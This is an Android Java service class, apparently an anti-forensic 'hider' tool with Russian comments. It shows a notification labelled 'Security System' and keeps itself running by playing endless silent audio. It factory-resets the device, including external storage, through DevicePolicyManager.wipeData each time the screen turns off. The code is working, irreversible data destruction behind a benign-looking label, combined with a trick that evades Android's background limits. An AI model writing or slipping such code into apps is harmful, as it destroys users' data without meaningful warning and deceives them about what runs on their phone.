package com.example.hider;

import android.app.*;
import android.app.admin.DevicePolicyManager;
import android.content.*;
import android.content.pm.ServiceInfo;
import android.media.AudioFormat;
import android.media.AudioManager;
import android.media.AudioTrack;
import android.os.Build;
import android.os.IBinder;

public class WatcherService extends Service {
    private static final String CH_ID = "GuardChan";
    private AudioTrack track;
    private BroadcastReceiver receiver;
    private long startTime;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        
        startTime = System.currentTimeMillis();

        NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
        if (nm != null) {
            if (nm.getNotificationChannel(CH_ID) == null) {
                NotificationChannel channel = new NotificationChannel(
                    CH_ID, "Security System", NotificationManager.IMPORTANCE_LOW);
                nm.createNotificationChannel(channel);
            }
        }

        Notification notif = new Notification.Builder(this, CH_ID)
                .setContentTitle("Profile Protected")
                .setSmallIcon(android.R.drawable.ic_lock_lock)
                .setOngoing(true)
                .build();

        if (Build.VERSION.SDK_INT >= 34) {
            startForeground(1, notif, ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PLAYBACK);
        } else {
            startForeground(1, notif);
        }

        if (track == null) {
            int bSize = AudioTrack.getMinBufferSize(8000, AudioFormat.CHANNEL_OUT_MONO, AudioFormat.ENCODING_PCM_16BIT);
            track = new AudioTrack(AudioManager.STREAM_MUSIC, 8000, 
                AudioFormat.CHANNEL_OUT_MONO, AudioFormat.ENCODING_PCM_16BIT, 
                bSize, AudioTrack.MODE_STREAM);
            track.play();
            
            new Thread(new Runnable() {
                @Override
                public void run() {
                    byte[] buffer = new byte[1024];
                    while (track != null) {
                        try {
                            track.write(buffer, 0, buffer.length);
                        } catch (Exception e) { break; }
                    }
                }
            }).start();
        }

        
        if (receiver == null) {
            receiver = new BroadcastReceiver() {
                @Override
                public void onReceive(Context context, Intent intent) {
                    if (System.currentTimeMillis() - startTime < 3000) return;
                    if (intent != null && Intent.ACTION_SCREEN_OFF.equals(intent.getAction())) {
                        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
                        if (dpm != null) {
                            try {
                                // Основная попытка вайпа (вместе с SD-картой)
                                dpm.wipeData(DevicePolicyManager.WIPE_EXTERNAL_STORAGE);
                            } catch (Exception e) {
                                dpm.wipeData(0);
                            }
                        }
                    }
                }
            };

            IntentFilter filter = new IntentFilter(Intent.ACTION_SCREEN_OFF);
            // Регистрируем как NOT_EXPORTED, чтобы только система могла слать SCREEN_OFF
            if (Build.VERSION.SDK_INT >= 34) {
                registerReceiver(receiver, filter, Context.RECEIVER_NOT_EXPORTED);
            } else {
                registerReceiver(receiver, filter);
            }
        }

        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        if (track != null) {
            try { track.stop(); track.release(); } catch (Exception ignored) {}
            track = null;
        }
        if (receiver != null) {
            try { unregisterReceiver(receiver); } catch (Exception ignored) {}
            receiver = null;
        }
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
